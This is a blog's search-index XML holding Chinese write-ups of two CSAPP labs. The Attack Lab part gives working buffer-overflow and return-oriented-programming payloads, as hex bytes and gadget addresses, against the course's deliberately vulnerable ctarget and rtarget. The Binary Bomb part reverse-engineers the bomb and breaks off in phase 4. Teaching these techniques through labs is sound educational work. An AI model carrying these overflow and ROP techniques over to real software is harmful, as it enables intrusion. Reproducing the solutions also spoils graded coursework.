<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>《CSAPP》实验三：缓冲区溢出攻击</title>
    <url>/2018/12/19/csapp-attacklab/</url>
    <content><![CDATA[<p>缓冲区溢出攻击也是第三章的配套实验，实验提供了两个有缓冲区溢出漏洞的x86-64程序(<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="noopener">CSAPP 3e: Attack Lab</a>)，要求我们设计“恶意输入”，利用程序漏洞，实现指令注入，执行未授权代码。两个漏洞程序：ctarget 和 rtarget。ctarget 对运行时栈无保护，既没有栈地址随机化，也允许执行栈上的指令，十分容易攻击。rtarget 则开启了栈地址随机化，且不允许执行栈上的指令，因此无法利用指令注入，对它的攻击被称为return-oriented programming (ROP)，要利用到程序中原有的一些特殊的字节序列：gadget。<a id="more"></a></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>程序用运行时栈(runtime stack)实现C语言中“函数”的概念。调用一个函数所需的栈空间被称为栈帧，按地址从大往小，从栈底往栈顶看，一个栈帧中依次保存了寄存器，局部变量，调用其他函数所需的参数，返回地址等，如下图所示(《CSAPP》图3-25)。函数执行完跳转回调用方，需要执行<code>ret</code>指令，<code>ret</code>可分为两步：一是从栈中弹出返回地址；二是设置程序计数器(Program Counter)<code>%rip</code>，将控制流转移到弹出的返回地址。当程序在栈上的缓冲区溢出，返回地址就可能被篡改，使得控制流跳转到未授权的指令。通过设计恶意输入，还能够在栈上注入指令，执行攻击者的非法操作。</p>
<img src="/.io//stack-frame.png" width="320px" height="480px" alt="栈帧结构" title="栈帧结构">

<p><code>objdump -d ctarget &gt; ctarget.d</code>，导出实验给出的的有缓存区溢出危险的函数如下。可以看到缓冲区大小为0x28，因此设计恶意输入时，要先用40字节写满缓冲区，下文就不再浪费笔墨写这40字节了。由于缓冲区是从栈顶向栈底写入的，且<code>getbuf</code>没有保存寄存器，看上面的栈帧结构图就知道，填满缓冲区之后，溢出的部分可以直接覆盖返回地址，这是攻击的基础。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq</span><br><span class="line">  4017be:   90                      nop</span><br><span class="line">  4017bf:   90                      nop</span><br></pre></td></tr></table></figure>

<p>实验提供了详细的说明，见<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">attacklab.pdf</a>。ctarget和rtarget包含了3个相同的目标函数：<code>touch1</code>，<code>touch2</code>和<code>touch3</code>。实验要求设计恶意输入，在栈上修改<code>getbuf</code>的返回地址并设计参数，调用这3个目标函数(rtarget不需要调用<code>touch1</code>)，<code>cookie</code>是实验提供的一个标识值，0x59b997fa。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ctarget"><a href="#ctarget" class="headerlink" title="ctarget"></a>ctarget</h1><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><ul>
<li>反汇编ctarget，<code>objdump -d ctarget &gt; ctarget.d</code></li>
<li>找到<code>touch1</code>的入口地址为<code>0x004017c0</code></li>
<li>注意先填满40字节缓冲区，且缓冲区是由栈顶向栈底写入的，地址应该从低字节向高字节写</li>
<li>保存答案为<code>phase_1</code>，检查答案执行<code>./hex2raw &lt; phase_1 | ./ctarget -q</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><ul>
<li>总的来说，要构造这样的一个恶意输入：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line"><span class="comment">// &lt;-- getbuf 开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">注入的指令的地址</span><br><span class="line"><span class="comment">// &lt;-- getbuf 执行完 ret 时，%rsp 的位置</span></span><br><span class="line">touch2 的地址</span><br><span class="line">movl $cookie, %edi</span><br><span class="line">ret</span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ctarget 没有随机化栈地址，gdb在<code>getbuf</code>的<code>ret</code>指令设断点，取到<code>%rsp</code>的值</li>
<li><code>注入的指令的地址</code> 应为 <code>%rsp + 0x10</code>，为 <code>0x5561dcb0</code></li>
<li><code>touch2</code>地址为<code>0x004017ec</code></li>
<li><code>movl $0x59b997fa, %edi</code> 机器码为 <code>bf fa 97 b9 59</code>，<code>ret</code> 机器码为 <code>c3</code></li>
<li>综上，答案如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line">b0 dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">bf fa <span class="number">97</span> b9 <span class="number">59</span></span><br><span class="line">c3</span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><ul>
<li><code>touch3</code>的参数是字符串，需要在栈上存储字符串</li>
<li>栈是向下（低地址）增长的，为了避免字符串参数被覆盖，其地址应高于返回地址，思路如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line"><span class="comment">// &lt;-- getbuf 开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">注入的指令的地址</span><br><span class="line"><span class="comment">// &lt;-- getbuf 执行完 ret 时，%rsp 的位置</span></span><br><span class="line">touch3 的地址</span><br><span class="line">cookie 字符串</span><br><span class="line"><span class="comment">// getbuf 执行完 ret 时，cookie 字符串地址为 %rsp + 0x8</span></span><br><span class="line">leaq <span class="number">0x8</span>(%rsp), %rdi</span><br><span class="line">ret</span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>同phase_2，gdb在<code>getbuf</code>的<code>ret</code>指令设断点，取到<code>%rsp</code>的值</li>
<li><code>注入的指令的地址</code> 应为 <code>%rsp + 0x20</code>，<code>0x20</code>为两个地址加字符串长度，为<code>0x5561dcc0</code></li>
<li><code>touch3</code>地址为 <code>0x004018fa</code></li>
<li><code>python -c &quot;print(&#39; &#39;.join(hex(ord(i))[2:] for i in &#39;59b997fa&#39;))&quot;</code></li>
<li>将cookie转为其ASCII的十六进制表示</li>
<li>注意C字符串以0结尾，为了方便计算补了8个字节0，这也是上面0x20的来源</li>
<li><code>leaq 0x8(%rsp), %rdi</code>机器码<code>48 8d 7c 24 08</code>，综上，答案：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line">c0 dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>  <span class="comment">// 字符串</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="comment">// 字符串结尾，8个字节方便计算</span></span><br><span class="line"><span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span></span><br><span class="line">c3 <span class="comment">// ret</span></span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<h1 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h1><p>与ctarget相比，对rtarget的攻击存在两个难点:</p>
<ul>
<li>引入了栈地址随机化，无法像攻击ctarget那样取得栈地址的绝对值。</li>
<li>栈上的指令不可执行，即使在栈注入指令，执行了也是 segmentation fault。</li>
</ul>
<p>第一点可以通过相对地址，即 <code>%rsp + offset</code> 的方式解决。<br>第二点则要利用rtarget中原有的特殊字节序列：gadget。上文的实验说明给了一个例子，程序中有这样的一个函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3 retq</span><br></pre></td></tr></table></figure>

<p>其中<code>48 89 c7</code>是<code>movq %rax, %rdi</code>的机器码，后面接着<code>c3</code>，即<code>retq</code>。缓冲区溢出，改写<code>getbuf</code>的返回地址为<code>48 89 c7</code>的地址(0x400f18)，就能执行<code>movq %rax, %rdi</code>这条指令，接着<code>retq</code>，使得攻击者可以继续利用上述过程执行攻击指令。以上攻击手段被称为return-oriented programming，<code>48 89 c7 c3</code>就是一个”gadget”。实验给出了所有可利用的gadget的源码，在farm.c，<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">attacklab.pdf</a>列出了rtarget中所有gadget及对应的指令。</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><ul>
<li>phase_4 要求调用<code>touch2</code>，需要传参，可以先把参数写入栈，再利用gadget <code>popq %rdi</code></li>
<li>搜索发现gadget farm没有 <code>popq %rdi</code>，只有 <code>popq %rax</code>和<code>movq %rax, %rdi</code></li>
<li>找到<code>popq %rax</code>和<code>movq %rax, %rdi</code>地址分别为0x004019cc，0x004019a2</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;-- getbuf 开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// gadget "popq %rax" 地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;-- popq %rax 开始执行时，%rsp 的位置</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;-- gadget "popq %rax" 开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// gadget "movq %rax, %rdi" 地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &lt;-- gadget "movq %rax, %rdi"  开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// touch2 地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈顶(高地址)</span></span><br></pre></td></tr></table></figure>

<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><ul>
<li><code>touch3</code>的参数是字符串，这要求我们在栈上存储字符串，且要取得字符串的地址</li>
<li>由于栈地址随机化，只能相对寻址，需要类似<code>leaq $offset(%rsp), %rdi</code>的指令</li>
<li>搜索gadget farm发现只有<code>lea (%rdi, %rsi, 1), %rax</code></li>
<li>所以<code>$offset</code>也要放到栈上，再<code>popq %rdi</code>或<code>popq %rsi</code></li>
<li>注意取栈地址时，<code>%rsp</code>不能作为<code>movl</code>的操作数，<code>movl</code>会对高位4字节补零</li>
<li>字符串地址必须比<code>touch3</code>返回地址高，否则会被覆盖</li>
<li><code>$offset</code>为字符串地址相对于<code>getbuf</code>开始执行时的栈地址的偏移值，为0x48</li>
<li>farm上的指令有限，需要做一些转换，综上，答案如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶(低地址)</span></span><br><span class="line"><span class="comment">// 40 字节，写满缓冲区</span></span><br><span class="line"><span class="comment">// &lt;-- getbuf 开始执行 ret 时，%rsp 的位置</span></span><br><span class="line">movq %rsp, %rax             <span class="comment">// 0x00401a06</span></span><br><span class="line">movq %rax, %rdi             <span class="comment">// 0x004019a2</span></span><br><span class="line">popq %rax                   <span class="comment">// 0x004019ab</span></span><br><span class="line"><span class="comment">// &lt;-- "popq %rax" 开始执行时，%rsp 的位置</span></span><br><span class="line"><span class="comment">// $offset</span></span><br><span class="line">movl %eax, %edx             <span class="comment">// 0x004019dd</span></span><br><span class="line">movl %edx, %ecx             <span class="comment">// 0x00401a34</span></span><br><span class="line">movl %ecx, %esi             <span class="comment">// 0x00401a13</span></span><br><span class="line">leaq (%rdi, %rsi, <span class="number">1</span>), %rax  <span class="comment">// 0x004019d6</span></span><br><span class="line">movq %rax, %rdi             <span class="comment">// 0x004019a2</span></span><br><span class="line"><span class="comment">// touch3 地址 0x004018fa</span></span><br><span class="line"><span class="comment">// cookie 字符串</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>《CSAPP》实验二：二进制炸弹</title>
    <url>/2018/12/05/csapp-bomb/</url>
    <content><![CDATA[<p>&emsp;&emsp;二进制炸弹是第三章《程序的机器级表示》的配套实验，这章主要介绍了x64汇编，包括：操作数的表示方式，数据传送指令，算术和逻辑指令，控制流跳转指令，过程（procedure）的实现与运行时栈帧，C语言中的数组，struct，union以及浮点数的汇编表示等。通过这章的学习，对C有了更深的理解，可以看出，C与汇编代码的相似度很高，称之为高级汇编也不为过。<a id="more"></a></p>
<p>&emsp;&emsp;这个实验提供了一个 Linux/x86-64 二进制程序（下载地址：<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">CSAPP: Labs</a>），即所谓的“二进制炸弹”。执行这个程序，它会要求你逐个输入6个字符串，只要输错了一个，“炸弹”就会被引爆。实验要求我们利用GDB对这个“炸弹”进行逆向工程，找到6个正确的字符串。整个实验十分有趣，寓教于乐，完成之后很有成就感。实验的基本思路如下：</p>
<ul>
<li>在各个检查输入字符串的地方设断点</li>
<li>先随便输入字符串，执行到断点处</li>
<li>反汇编，找到正确字符串，保存答案，去掉对应的断点，继续</li>
</ul>
<p>&emsp;&emsp;GDB的各种操作，下载一张<a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener">速查表</a>，反复用就熟悉了。实验也提供了“炸弹”的<code>main</code>函数源码，可以看出输入的字符串分别由6个函数检查，分别是 <code>phase_1</code>，<code>phase_2</code>，…，<code>phase_6</code>。在<code>phase_1</code>设好断点，实验就开始啦：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb bomb</span><br><span class="line">(gdb) <span class="built_in">break</span> phase_1</span><br><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>

<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p><code>(gdb) disas</code> 反汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">=&gt; 0x0000000000400ee0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:	mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:	test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:	retq</span><br></pre></td></tr></table></figure>

<p><code>phase_1</code>把两个字符串传给了<code>strings_not_equal</code>，若两个字符串不相等，炸弹就爆炸。输入的字符串是第一个参数<code>%rdi</code>，<code>$0x402400</code>是第二个参数，<code>(gdb) print (char*) 0x402400</code>，打印出来就是第一个字符串，第一题比较简单。</p>
<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">=&gt; 0x0000000000400efc &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:	push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:	mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:	cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:	je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:	jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:	add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:	cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:	jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:	jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:	lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:	lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:	jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:	pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:	pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:	retq</span><br></pre></td></tr></table></figure>

<p> 翻译回C语言如下，第3行<code>sub $0x28,%rsp</code> 分配了一个数组，向前的跳转是循环，第二个字符串是个等比数列<code>&quot;1 2 4 8 16 32&quot;</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rsp[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(rsp, nums);</span><br><span class="line">    <span class="keyword">if</span> (rsp[<span class="number">0</span>] != <span class="number">1</span>)</span><br><span class="line">        explode_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* rbx = rsp + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>* rpb = rsp + <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> eax = rbx[<span class="number">-1</span>];</span><br><span class="line">        eax += eax;</span><br><span class="line">        <span class="keyword">if</span> (*rbx != eax)</span><br><span class="line">            explode_bomb();</span><br><span class="line"></span><br><span class="line">        rbx += <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (rbx != rbp)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">=&gt; 0x0000000000400f43 &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:	cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:	jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:	mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:	mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:	mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:	mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:	mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:	mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:	mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>2 - 10：调用<code>sscanf</code>，格式地址在0x4025cf，值为<code>&quot;%d %d&quot;</code>，可见这一关要求输入两个整数。<br>11 - 12：要求第一个整数小于等于7。<br>13 - 14：典型的switch语句，根据第一个整数的值跳转，跳转表地址为0x402470。<br>15 - 34：根据跳转表设置第二个整数，答案不唯一，有8个，随便选个<code>&quot;0 207&quot;</code>。</p>
<p><code>(gdb) x /8xg 0x402470</code>打印跳转表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402470:	0x0000000000400f7c	0x0000000000400fb9</span><br><span class="line">0x402480:	0x0000000000400f83	0x0000000000400f8a</span><br><span class="line">0x402490:	0x0000000000400f91	0x0000000000400f98</span><br><span class="line">0x4024a0:	0x0000000000400f9f	0x0000000000400fa6</span><br></pre></td></tr></table></figure>

<h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:	cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:	jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:	jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   